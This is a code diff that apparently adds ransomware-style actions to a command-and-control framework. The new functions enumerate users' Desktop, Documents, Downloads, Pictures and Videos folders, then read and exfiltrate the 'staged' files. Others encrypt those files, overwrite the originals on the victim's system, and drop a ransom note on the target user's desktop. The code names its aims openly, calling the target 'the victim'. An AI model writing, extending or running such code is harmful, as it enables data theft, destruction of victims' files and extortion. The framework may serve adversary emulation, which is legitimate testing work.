@@ -25,6 +25,22 @@ def list_target_local_user_desktop():
     return action
 
 
+def find_sensitive_files():
+    commands_list = ["dir \\??\\C:\\Users\\{local_users}\\Desktop\\",
+                     "dir \\??\\C:\\Users\\{local_users}\\Documents\\",
+                     "dir \\??\\C:\\Users\\{local_users}\\Downloads\\",
+                     "dir \\??\\C:\\Users\\{local_users}\\Pictures\\",
+                     "dir \\??\\C:\\Users\\{local_users}\\Videos\\"]
+    parser = c2parsers.sensitive_files_dir_parser
+    required_facts = ['local_users']
+    name = "Find sensitive files"
+    description = "Find files with sensitive extensions in some well-known folders for all local users (iterative)"
+    output_facts = ['staged_files']
+    action = C2Action(commands_list, parser, required_facts, name, description, output_facts)
+    action.iterativeAction()
+    return action
+
+
 def read_file():
     commands_list = ["read {target_file}"]
     parser = c2parsers.generic_file_parser
@@ -45,6 +61,41 @@ def read_staged_files():
     output_facts = ['exfiltrated_files']
     action = C2Action(commands_list, parser, required_facts, name, description, output_facts)
     action.iterativeAction()
+    return action
+
+
+def read_and_encrypt_staged_files():
+    commands_list = ["read {staged_files}"]
+    parser = c2parsers.file_parsing_and_encryption
+    required_facts = ['staged_files']
+    name = "Exfiltrate a list of staged files and encrypt them"
+    description = "Read a list of files from the victim's file system and encrypt them, preparing the files that " \
+                  "will overwrite the original files on the remote file system; it is an iterative action"
+    output_facts = ['exfiltrated_files']
+    action = C2Action(commands_list, parser, required_facts, name, description, output_facts)
+    action.iterativeAction()
+    return action
+
+
+def send_encrypted_files():
+    commands_list = ["write {staged_files}"]
+    parser = c2parsers.null_parser
+    required_facts = ['staged_files', 'exfiltrated_files']
+    name = "Encrypt remote files"
+    description = "Read previously encrypted files, which are the exfiltrated_files with .enc extension, and use " \
+                  "them to overwrite the staged_files on the remote file system"
+    action = C2Action(commands_list, parser, required_facts, name, description)
+    action.iterativeAction()
+    return action
+
+
+def write_ransom_message():
+    commands_list = write_file("ransom_message.txt", "\\??\\C:\\Users\\{target_local_user}\\Desktop\\ransom.txt").commandsList
+    parser = c2parsers.null_parser
+    required_facts = ['target_local_user']
+    name = "Write ransom message"
+    description = "Write a message asking for ransom on the desktop of the target_local_user (one of the victim users)"
+    action = C2Action(commands_list, parser, required_facts, name, description)
     return action
 
 
